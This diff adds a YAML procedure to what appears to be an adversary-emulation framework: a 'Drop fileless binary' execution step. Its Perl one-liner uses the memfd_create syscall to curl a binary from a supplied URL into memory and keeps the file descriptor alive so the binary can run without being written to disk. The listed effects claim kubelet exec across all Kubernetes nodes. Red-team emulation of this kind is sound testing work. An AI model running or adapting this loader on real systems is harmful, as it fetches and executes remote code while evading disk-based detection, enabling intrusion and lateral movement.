@@ -1,0 +1,32 @@
+name: Drop fileless binary
+description: Downloads a binary from the provided source to a system and executes it in memory without writing to disk
+tactic: Execution
+techniques: ["User Execution"]
+parameters:
+  URL:
+    type: string
+    description: the url from where to download the binary
+  NAME:
+    type: string
+    description: the name of the binary to execute in memory.  The name is used for tracking the binary in the system as the fileless version has only a number
+procedures:
+  - key: perl
+    command: | 
+      perl -e '
+        $s = (`uname -m` =~ /aarch64/) ? 279 : 319; $n = " "; $fd = syscall($s, $n, 0);
+        if ($fd == -1) { die "Syscall failed" }
+        system("curl -sL '${URL}' -o /dev/fd/$fd");
+        if ($pid = fork) { 
+            print "/proc/$pid/fd/$fd\n"; exit 0;
+        } else {
+            open(STDOUT, ">", "/dev/null");
+            open(STDERR, ">", "/dev/null");
+            sleep while 1;
+        }
+      '
+preconditions:
+  kind: System
+  accessLevel: "user-exec"
+effects: ["sys.has-binary(${NAME}, ${OUTPUT})", "k8s.kubelet-exec(sys, all(k8s.Node))"]
+
+
